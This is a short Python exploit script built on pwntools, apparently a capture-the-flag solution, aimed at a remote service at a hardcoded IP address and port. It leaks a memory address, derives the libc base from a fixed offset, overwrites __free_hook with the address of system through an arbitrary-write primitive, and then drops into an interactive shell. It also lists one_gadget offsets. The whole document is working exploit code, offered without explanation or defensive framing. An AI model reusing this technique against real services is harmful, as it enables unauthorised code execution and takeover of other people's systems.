from pwn import *

REMOTE_OFFSET = 0x7f1f3fc91000 - 0x7f1f3f490010
treasures = [0x4f2c5, 0x4f322, 0x10a38c]

def tryOut(offset):
	global stop
	p = remote("3.112.41.140", 56746)
	p.sendlineafter("Size:",str(0x800000))
	p.recvuntil("Magic:")
	addr = int(p.recvline(),16)
	LIBC = addr + offset
	log.info("LIBC: 0x%x"%LIBC)

	malloc_hook = LIBC + libc.symbols['__malloc_hook']
	free_hook = LIBC + libc.symbols['__free_hook']
	printf = LIBC + libc.symbols['printf']
	stack_chk_fail = LIBC + libc.symbols['__stack_chk_fail']
	libc_version = LIBC + 0x21cb0
	system = LIBC + libc.symbols['system']
	one_gadget = LIBC + treasures[0]
	index = (free_hook-addr)/8
	p.sendlineafter("Offset & Value:", "%x"%index)
	p.sendline("%x"%(system))
	p.sendlineafter("Offset & Value:","a".ljust(0x500,"a"))
	p.sendline("ed") # wtf?
	p.interactive()


if __name__ == "__main__":
	stop = False
	offset = REMOTE_OFFSET
	libc = ELF("./libc.so.6")

	tryOut(REMOTE_OFFSET)

	
	
